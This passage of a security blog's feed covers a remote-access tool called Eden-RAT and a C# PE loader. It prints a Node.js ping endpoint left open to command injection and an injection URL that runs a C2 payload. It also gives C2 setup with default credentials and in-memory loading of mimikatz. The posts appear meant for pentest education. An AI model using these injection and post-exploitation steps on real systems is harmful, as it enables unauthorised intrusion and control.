NetBus</a></td></tr><tr><td>Beast</td><td><a href="https://iss4cf0ng.github.io/2026/02/20/2026-2-20-Beast/">Analyzing BeastDoor</a></td></tr></tbody></table></div><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><blockquote id="fn_1"><sup>1</sup>. <a href="https://en.wikipedia.org/wiki/The_Shadow_Brokers">https://en.wikipedia.org/wiki/The_Shadow_Brokers</a><a href="#reffn_1" title="Jump back to footnote [1] in the text."> &#8617;</a></blockquote><h1 id="THANSK-FOR-READING"><a href="#THANSK-FOR-READING" class="headerlink" title="THANSK FOR READING"></a>THANSK FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width=400></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h1&gt;&lt;p&gt;Recently, I have been developing diffe</summary>
      
    
    
    
    <category term="Studying/RAT" scheme="https://iss4cf0ng.github.io/categories/Studying-RAT/"/>
    
    
    <category term="Studying" scheme="https://iss4cf0ng.github.io/tags/Studying/"/>
    
    <category term="Reverse Engineering" scheme="https://iss4cf0ng.github.io/tags/Reverse-Engineering/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Malware" scheme="https://iss4cf0ng.github.io/tags/Malware/"/>
    
    <category term="Malware Analysis" scheme="https://iss4cf0ng.github.io/tags/Malware-Analysis/"/>
    
    <category term="Remote Access Tool" scheme="https://iss4cf0ng.github.io/tags/Remote-Access-Tool/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Java Code Audit (Fundamental)</title>
    <link href="https://iss4cf0ng.github.io/2026/02/17/2026-2-17-JavaCodeAudit/"/>
    <id>https://iss4cf0ng.github.io/2026/02/17/2026-2-17-JavaCodeAudit/</id>
    <published>2026-02-17T06:18:55.000Z</published>
    <updated>2026-02-21T12:49:54.271Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-Libro"><a href="#El-Libro" class="headerlink" title="El Libro"></a>El Libro</h1><p align="center" class='item-img' data-src='/images/books/JavaCodeAuditFundamental/libro.png'><img src="/images/books/JavaCodeAuditFundamental/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “C++ Concurrency In Action (Second Edition)”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-4-Java-EE"><a href="#Chapter-4-Java-EE" class="headerlink" title="Chapter 4 - Java EE"></a>Chapter 4 - Java EE</h1><p>There are three main versions of Java platform:</p><ul><li>Java SE (Java Platform Standard Edition)</li><li>Java EE (Java Platform Enterprise Edition)</li><li>Java ME (Java Platform Micro Edition)</li></ul><h2 id="4-1-Hierarchy-of-Java-EE"><a href="#4-1-Hierarchy-of-Java-EE" class="headerlink" title="4.1 - Hierarchy of Java EE"></a>4.1 - Hierarchy of Java EE</h2><h3 id="Terminology"><a href="#Terminology" class="headerlink" title="Terminology"></a>Terminology</h3><ul><li>JDBC: Java Database Connectivity</li><li>JNDI: Java Naming and Directory</li><li>EJB: JavaBean</li><li>RMI: Remote Method Invocation</li><li>Servlet: Server Applet</li><li>JSP: JavaServer Pages</li><li>XML: eXtensible Markup Language</li><li>JMS: Java Message Service</li></ul><h3 id="Java-MVC"><a href="#Java-MVC" class="headerlink" title="Java MVC"></a>Java MVC</h3><p>It was introduced in 1978.</p><ul><li><strong>Model</strong>: It represents an object or Java POJO with data.</li><li><strong>Controller</strong>: It controls logics of <strong>Model</strong> or <strong>View</strong>. It inputs data from user to <strong>Model</strong>.</li><li><strong>View</strong>: Visualization of data in <strong>Model</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-Libro&quot;&gt;&lt;a href=&quot;#El-Libro&quot; class=&quot;headerlink&quot; title=&quot;El Libro&quot;&gt;&lt;/a&gt;El Libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="https://iss4cf0ng.github.io/categories/Book/"/>
    
    
    <category term="Book" scheme="https://iss4cf0ng.github.io/tags/Book/"/>
    
    <category term="Note" scheme="https://iss4cf0ng.github.io/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title>[Eden-RAT] How to Use Eden-RAT During the Early Stage of Penetration Testing</title>
    <link href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-EdenPentestInitialStage/"/>
    <id>https://iss4cf0ng.github.io/2026/02/09/2026-2-9-EdenPentestInitialStage/</id>
    <published>2026-02-09T08:54:33.000Z</published>
    <updated>2026-02-18T06:32:53.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article shows how to use <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-ToolEdenRAT/">Eden-RAT</a> in the early stage of penetration testing.</p><p>Github Repository: <a href="https://github.com/iss4cf0ng/Eden-RAT/">https://github.com/iss4cf0ng/Eden-RAT/</a></p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/overall.png'><img src="/images/article/tools/eden/init_stage/overall.png" width="1000"></p><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed out of personal interest in cybersecurity research and education.<br>It must <strong>not</strong> be used for illegal or unauthorized activities.<br>The author is not responsible for any misuse or damage caused by this software.</p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>The following table describes the experimental environment:</p><div class="table-container"><table><thead><tr><th>Host</th><th>OS</th><th>Description</th></tr></thead><tbody><tr><td>172.23.243.133</td><td>WSL</td><td>Eden-Server (C2 server)</td></tr><tr><td>192.168.1.131:3000</td><td>Ubuntu x64</td><td>Linux server with an RCE vulnerability</td></tr><tr><td>192.168.1.125</td><td>Windows 10</td><td>Eden-Client</td></tr></tbody></table></div><h3 id="Vulnerable-Machine"><a href="#Vulnerable-Machine" class="headerlink" title="Vulnerable Machine"></a>Vulnerable Machine</h3><p>In this demonstration, I deployed an Linux server with a simple RCE vulnerability. The server runs a <strong>Node.js</strong> web service.</p><p>Below is the Node.js code that contains the RCE vulnerability:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//app.js<br>const express = require(&quot;express&quot;);<br>const &#123; exec &#125; = require(&quot;child_process&quot;);<br><br>const app = express();<br>const PORT = 3000;<br><br>app.get(&quot;/ping&quot;, (req, res) =&gt; &#123;<br>  const host = req.query.host;<br><br>  if (!host) &#123;<br>    return res.send(`<br>      &lt;h2&gt;Ping a host&lt;/h2&gt;<br>      &lt;form&gt;<br>        &lt;input name=&quot;host&quot; placeholder=&quot;Enter host&quot; /&gt;<br>        &lt;button type=&quot;submit&quot;&gt;Ping&lt;/button&gt;<br>      &lt;/form&gt;<br>    `);<br>  &#125;<br><br>  exec(`ping -c 1 $&#123;host&#125;`, (error, stdout, stderr) =&gt; &#123;<br>    if (error) &#123;<br>      return res.send(`&lt;pre&gt;$&#123;stderr&#125;&lt;/pre&gt;`);<br>    &#125;<br>    res.send(`&lt;pre&gt;$&#123;stdout&#125;&lt;/pre&gt;`);<br>  &#125;);<br>&#125;);<br><br>app.listen(PORT, () =&gt; &#123;<br>  console.log(`Server running at http://localhost:$&#123;PORT&#125;`);<br>&#125;);<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/1.png'><img src="/images/article/tools/eden/init_stage/1.png" width="700"></p><p>This web application provides a ping feature used to test network connectivity or resolve domain names.<br>The nutshell of this feature is executing a Linux command. An RCE vulnerability can occur if a malicious user appends a semicolon (<code>;</code>) followed by arbitrary Linux commands to the host parameter:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/2.png'><img src="/images/article/tools/eden/init_stage/2.png" width="700"></p><p>Again, this is a very simple demonstration of RCE vulnerability. In real-world scenarios, RCE vulnerabilities are not always straightforward——just as buffer overflows in operating systems are often more complex. However, for educational purpose, simple is the best!</p><p>Now, let’s try to exploit this vulnerability using Eden-RAT.</p><h2 id="Deploy-Eden-C2-Server"><a href="#Deploy-Eden-C2-Server" class="headerlink" title="Deploy Eden C2 Server"></a>Deploy Eden C2 Server</h2><p>If you want to know how to deploy your Eden-Server and Eden-Client, please <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-ToolEdenRAT/#Deploy-Eden-C2-Server">click here</a>.</p><h2 id="Generate-a-payload"><a href="#Generate-a-payload" class="headerlink" title="Generate a payload"></a>Generate a payload</h2><p>Both the encryption and decryption mechanisms are implemented natively (pure implementation).<br>This means the target platform does not require any third-party libraries.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/3.png'><img src="/images/article/tools/eden/init_stage/3.png" width="300"></p><p>If the payload is generated successfully, Eden-RAT will display the raw payload code,<br>Next, switch the combo box selection to <code>Command</code>, then click <code>Copy</code>:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/7.png'><img src="/images/article/tools/eden/init_stage/7.png" width="700"></p><p>Before exploitation, don’t forget to URL-encode the payload!</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/4.png'><img src="/images/article/tools/eden/init_stage/4.png" width="700"></p><p>Now, let’s proceed with the RCE exploitation:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/ping?host=github.com;python3%20-c%20............(Your payload)<br></code></pre></td></tr></table></figure></p><p>Once the target Linux machine is online, we can execute interactive commands through the virtual terminal:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/5.png'><img src="/images/article/tools/eden/init_stage/5.png" width="800"></p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/6.png'><img src="/images/article/tools/eden/init_stage/6.png" width="800"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/tea_party.gif'><img src="/images/meme/tea_party.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article shows how to use </summary>
      
    
    
    
    <category term="Tools/Eden-RAT" scheme="https://iss4cf0ng.github.io/categories/Tools-Eden-RAT/"/>
    
    
    <category term="Penetration" scheme="https://iss4cf0ng.github.io/tags/Penetration/"/>
    
    <category term="Pentesting" scheme="https://iss4cf0ng.github.io/tags/Pentesting/"/>
    
    <category term="Tools" scheme="https://iss4cf0ng.github.io/tags/Tools/"/>
    
    <category term="Eden-RAT" scheme="https://iss4cf0ng.github.io/tags/Eden-RAT/"/>
    
  </entry>
  
  <entry>
    <title>[Tool] Eden-RAT——A lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing</title>
    <link href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-ToolEdenRAT/"/>
    <id>https://iss4cf0ng.github.io/2026/02/09/2026-2-9-ToolEdenRAT/</id>
    <published>2026-02-09T08:53:54.000Z</published>
    <updated>2026-02-18T06:32:48.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>While developing <a href="https://github.com/iss4cf0ng/EgoDrop/">EgoDrop</a> and <a href="https://github.com/iss4cf0ng/DuplexSpyCS/">DuplexSpy</a>, I successfully implemented an interactive shell within a C#-based GUI application. I then recalled one of my earlier projects that had been suspended due to my limited development experience at the time. Therefore, I decided to revisit and complete it.</p><p>The idea of this project originated when I was learning web penetration testing.<br>When discovering an RCE (Remote Code/Command Execution) vulnerability, we usually demonstrate it with simple Linux commands(e.g., <code>id</code>, <code>whoami</code>, <code>ls</code>, <code>cat /etc/passwd</code>), and that is often the end of the story. However, if we want to conduct further post-exploitation——such as pivoting into the internal network——we may rely on reverse shell tools like <code>metasploit</code>, <code>nc</code> or <code>openssl</code>. Although they are powerful and widely used, they still have certain limitations in practical penetration testing scenario.s<br>Therefore, I decided to develop a GUI-based remote access tool which can be leveraged after achieving RCE, establishing a robust and secure channel with an interactive shell and file manager.</p><p>Developing and maintaining this tool entirely on my own is challenging due to limited time, resources, and experience. As a result, the project may still contain undiscovered defects or design flaws. If you encounter any issues while using this tool, please feel free to open an issue or contact me.</p><p>If you find this tool informative or helpful, a star ⭐ will be greatly appreciated. </p><p>If you are interested in a demonstration of exploitation, please <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-EdenPentestInitialStage/">click here</a>.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Eden-RAT is a lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing.<br>It provides a Graphical User Interface (GUI) with multiple features targeting Linux systems, including a file manager and an interactive shell.</p><p>The interactive shell enables full command execution, allowing users to run commands such as <code>ssh</code>, <code>apt</code>, <code>pip install</code>, <code>vim</code>, and other interactive programs seamlessly.</p><p>Github Repository: <a href="https://github.com/iss4cf0ng/Eden-RAT/">https://github.com/iss4cf0ng/Eden-RAT/</a></p><h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><h1 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h1><h2 id="Eden-Operator"><a href="#Eden-Operator" class="headerlink" title="Eden (Operator)"></a>Eden (Operator)</h2><ul><li>Build Payload</li><li>Multi Listener</li><li>Encrypted Channels</li></ul><h2 id="Infected-Machine"><a href="#Infected-Machine" class="headerlink" title="Infected Machine"></a>Infected Machine</h2><ul><li>Information</li><li>File Manager<ul><li>Display Image</li><li>Edit, Copy, Move, Paste, Upload, Download, Rename, Datetime</li><li>WGET</li><li>Archive: Compress, Extract</li><li>New: Folder, Text File</li></ul></li><li>Process View</li><li>Service View</li><li>Connection: Disconnect, Reconnect</li></ul><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed out of personal interest in cybersecurity research and education.<br>It must <strong>not</strong> be used for illegal or unauthorized activities.<br>The author is not responsible for any misuse or damage caused by this software.</p><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/meme/koyuki_jail.jpg'><img src="https://iss4cf0ng.github.io/images/meme/koyuki_jail.jpg" width=300></p><h1 id="Technical-Overview"><a href="#Technical-Overview" class="headerlink" title="Technical Overview"></a>Technical Overview</h1><p>Eden-RAT supprots encrypted communication using either AES/RSA hybrid encryption or TLS.</p><p>The AES pure implementation is adapted from:<br><a href="https://github.com/bozhu/AES-Python">https://github.com/bozhu/AES-Python</a></p><p>Once a payload successfully connects to the Eden server, it dynamically loads additional modules delivered by the server. These modules are executed via <code>exec()</code> and their class instances are registered within an internal dictionary-based class registry.</p><p>The overall architecture is illustrated below:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/technical.png'><img src="/images/article/tools/eden/main/technical.png" width="700"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><p>Eden-RAT consists of three components——Eden-Server, Eden-Client and the payload. </p><p>The overall architecture is shown as below:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/architecture.png'><img src="/images/article/tools/eden/main/architecture.png" width="1000"></p><p>All communication channels are point-to-point encrypted. The communication channel between the Eden-Server and the Eden-Client is encrypted using AES+RSA, while a channel between the Eden-Server and the target Linux server is encrypted using either AES+RSA or TLS.</p><h2 id="Eden-Server"><a href="#Eden-Server" class="headerlink" title="Eden-Server"></a>Eden-Server</h2><p>An Eden-Server is a python-based socket server. It provides multiple listeners for accepting and handling socket session from <strong>Eden-Clients</strong> and target Linux servers. It forwards messages between infected Linux systems and Eden-Clients, and processes tasks such as <strong>adding listener</strong>, <strong>building payload</strong> requested by Eden-Clients. </p><p>Note that an Eden-Server requires <code>pycryptodome</code>.</p><p>Available argument:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/server/1.png'><img src="/images/article/tools/eden/server/1.png" width="700"></p><h2 id="Eden-Client"><a href="#Eden-Client" class="headerlink" title="Eden-Client"></a>Eden-Client</h2><p>An Eden-Client is a C2 user who performs exploitation. All the tasks can only be processed after the Eden-Client connects to an Eden-Server.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/4.png'><img src="/images/article/tools/eden/main/4.png" width="700"></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>A payload is a script which is used for exploitation. <strong>All cryptographic algorithms implemented in the payload are written natively</strong>. It means the target Linux server doesn’t requires any third-party libraries (such as <code>pycryptodome</code>), but only a compatible runtime environment (e.g., python 3.10).</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/info/1.png'><img src="/images/article/tools/eden/info/1.png" width="700"></p><h2 id="File-Manager"><a href="#File-Manager" class="headerlink" title="File Manager"></a>File Manager</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/file/1.png'><img src="/images/article/tools/eden/file/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/eden/file/2.png'><img src="/images/article/tools/eden/file/2.png" width="700"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/6.png'><img src="/images/article/tools/eden/init_stage/6.png" width="700"></p><h2 id="Process-View"><a href="#Process-View" class="headerlink" title="Process View"></a>Process View</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/process/1.png'><img src="/images/article/tools/eden/process/1.png" width="700"></p><h2 id="Service-View"><a href="#Service-View" class="headerlink" title="Service View"></a>Service View</h2><p align="center" class='item-img' data-src='/images/article/tools/eden/service/1.png'><img src="/images/article/tools/eden/service/1.png" width="700"></p><h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><h2 id="Deploy-Eden-C2-Server"><a href="#Deploy-Eden-C2-Server" class="headerlink" title="Deploy Eden C2 Server"></a>Deploy Eden C2 Server</h2><p>Before starting the C2 server, you need to install <code>pycryptodome</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pip3 install pycryptodome<br></code></pre></td></tr></table></figure></p><p>After installing the package, <strong>you must generate an SSL private key and certificate:</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes<br></code></pre></td></tr></table></figure><br>Make sure the files are named exactly:</p><ul><li><code>key.pem</code></li><li><code>cert.pem</code></li></ul><p>Finally, start the C2 server:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 eden_server.py -lvvp 4444<br></code></pre></td></tr></table></figure></p><p>Our Eden-Server has been deployed.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/server/1.png'><img src="/images/article/tools/eden/server/1.png" width="700"></p><h2 id="Start-Eden-Client-and-Connect-to-the-C2-Server"><a href="#Start-Eden-Client-and-Connect-to-the-C2-Server" class="headerlink" title="Start Eden Client and Connect to the C2 Server"></a>Start Eden Client and Connect to the C2 Server</h2><p>The default C2 user’s credential are:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username = sdksdk<br>password = 123456<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/2.png'><img src="/images/article/tools/eden/main/2.png" width="400"></p><p>After logging in successfully, you should see the following message box:</p><p align="center" class='item-img' data-src='/images/article/tools/eden/main/3.png'><img src="/images/article/tools/eden/main/3.png" width="500"></p><h2 id="Add-Delete-a-C2-User"><a href="#Add-Delete-a-C2-User" class="headerlink" title="Add/Delete a C2 User"></a>Add/Delete a C2 User</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 eden_server.py --db<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/eden/user/1.png'><img src="/images/article/tools/eden/user/1.png" width="700"></p><p>Note that your input of password is invisible, which is expected.</p><h2 id="Generate-a-payload"><a href="#Generate-a-payload" class="headerlink" title="Generate a payload"></a>Generate a payload</h2><p>Both the encryption and decryption mechanisms are implemented natively (pure implementation).<br>This means the target platform does not require any third-party libraries.</p><p align="center" class='item-img' data-src='/images/article/tools/eden/init_stage/3.png'><img src="/images/article/tools/eden/init_stage/3.png" width="300"></p><h2 id="Infection"><a href="#Infection" class="headerlink" title="Infection"></a>Infection</h2><p>You can run the payload script directly:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 payload.py<br></code></pre></td></tr></table></figure></p><p>You can also execute the payload after achieving RCE. If you are interested in a demonstration of exploitation, please <a href="https://iss4cf0ng.github.io/2026/02/09/2026-2-9-EdenPentestInitialStage/">click here</a>.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/tea_party.gif'><img src="/images/meme/tea_party.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Preface&quot;&gt;&lt;a href=&quot;#Preface&quot; class=&quot;headerlink&quot; title=&quot;Preface&quot;&gt;&lt;/a&gt;Preface&lt;/h1&gt;&lt;p&gt;While developing &lt;a href=&quot;https://github.com/iss4c</summary>
      
    
    
    
    <category term="Tools/Eden-RAT" scheme="https://iss4cf0ng.github.io/categories/Tools-Eden-RAT/"/>
    
    
    <category term="Code" scheme="https://iss4cf0ng.github.io/tags/Code/"/>
    
    <category term="C#" scheme="https://iss4cf0ng.github.io/tags/C/"/>
    
    <category term="Python" scheme="https://iss4cf0ng.github.io/tags/Python/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Pentesting" scheme="https://iss4cf0ng.github.io/tags/Pentesting/"/>
    
    <category term="Remote Access Tool" scheme="https://iss4cf0ng.github.io/tags/Remote-Access-Tool/"/>
    
    <category term="Tools" scheme="https://iss4cf0ng.github.io/tags/Tools/"/>
    
    <category term="Eden-RAT" scheme="https://iss4cf0ng.github.io/tags/Eden-RAT/"/>
    
  </entry>
  
  <entry>
    <title>[Tools] dotNetPELoader——A C# PE loader for x64 and x86 PE files.</title>
    <link href="https://iss4cf0ng.github.io/2026/02/06/2026-2-6-ToolDotNetPELoader/"/>
    <id>https://iss4cf0ng.github.io/2026/02/06/2026-2-6-ToolDotNetPELoader/</id>
    <published>2026-02-06T14:33:48.000Z</published>
    <updated>2026-02-22T17:23:24.020Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Recently, when I was developing a fileless execution method for <a href="https://github.com/iss4cf0ng/DuplexSpyCS">DuplexSpy RAT</a> version 2, I could hardly find a C#-based x86 PE loader.<br>Most existing implementations I found were x64-only, such as the one developed by <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a></p><p align="center" class='item-img' data-src='/images/meme/mika_neko.png'><img src="/images/meme/mika_neko.png" width="300"></p><p>Therefore, I decided to develop a C#-based x86 PE loader myself.</p><p>This console application allows you to load either x86 or x64 PE files into memory.<br>First, it reads the file bytes from the specified file path, then determines the architecture of both the loader and the target PE file.</p><p>An x64 PE cannot be loaded by an x86 loader, and vice versa.</p><p>View the GitHub repository <a href="https://github.com/iss4cf0ng/dotNetPELoader">here</a>  </p><h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><ul><li>Load <strong>x86 PE in x86 process</strong></li><li>Load <strong>x64 PE in x64 process</strong></li><li>Handles relocation and import resolving</li><li>Fully written in C#</li></ul><p>If you find this project useful, a ⭐ would be appreciated.</p><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/meme/mika_cute.jpg'><img src="https://iss4cf0ng.github.io/images/meme/mika_cute.jpg" width="200"></p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x64 x64_file.exe<br>dotNetPELoader.exe --x86 x86_file.exe<br>dotNetPELoader.exe --coffee<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/hello.png'><img src="/images/article/tools/dotNetPELoader/hello.png" width="600"></p><h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><h2 id="x64-mimikatz"><a href="#x64-mimikatz" class="headerlink" title="x64 - mimikatz"></a>x64 - mimikatz</h2><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/anycpu.png'><img src="/images/article/tools/dotNetPELoader/anycpu.png" width="600"></p><p>If you try to load an x86 PE while the loader is an x64 loader, an exception will be thrown:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x64 mimikatz<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.1.png'><img src="/images/article/tools/dotNetPELoader/x64.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.2.png'><img src="/images/article/tools/dotNetPELoader/x64.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x64.3.png'><img src="/images/article/tools/dotNetPELoader/x64.3.png" width="600"></p><h2 id="x86-mimikatz"><a href="#x86-mimikatz" class="headerlink" title="x86 - mimikatz"></a>x86 - mimikatz</h2><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86_cpu.png'><img src="/images/article/tools/dotNetPELoader/x86_cpu.png" width="600"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dotNetPELoader.exe --x86 mimikatz<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86.1.png'><img src="/images/article/tools/dotNetPELoader/x86.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/dotNetPELoader/x86.2.png'><img src="/images/article/tools/dotNetPELoader/x86.2.png" width="600"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/rio_pc.jpg'><img src="/images/meme/rio_pc.jpg" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Recently, when I was developin</summary>
      
    
    
    
    <category term="Tools/dotNetPELoader" scheme="https://iss4cf0ng.github.io/categories/Tools-dotNetPELoader/"/>
    
    
    <category term="C#" scheme="https://iss4cf0ng.github.io/tags/C/"/>
    
    <category term="Documentation" scheme="https://iss4cf0ng.github.io/tags/Documentation/"/>
    
    <category term="PE File" scheme="https://iss4cf0ng.github.io/tags/PE-File/"/>
    
    <category term="Fileless Execution" scheme="https://iss4cf0ng.github.io/tags/Fileless-Execution/"/>
    
    <category term="PE Loader" scheme="https://iss4cf0ng.github.io/tags/PE-Loader/"/>
    
    <category term="x86" scheme="https://iss4cf0ng.github.io/tags/x86/"/>
    
    <category term="x64" scheme="https://iss4cf0ng.github.io/tags/x64/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] Fileless Execution</title>
    <link href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/"/>
    <id>https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/</id>
    <published>2026-02-03T15:42:02.000Z</published>
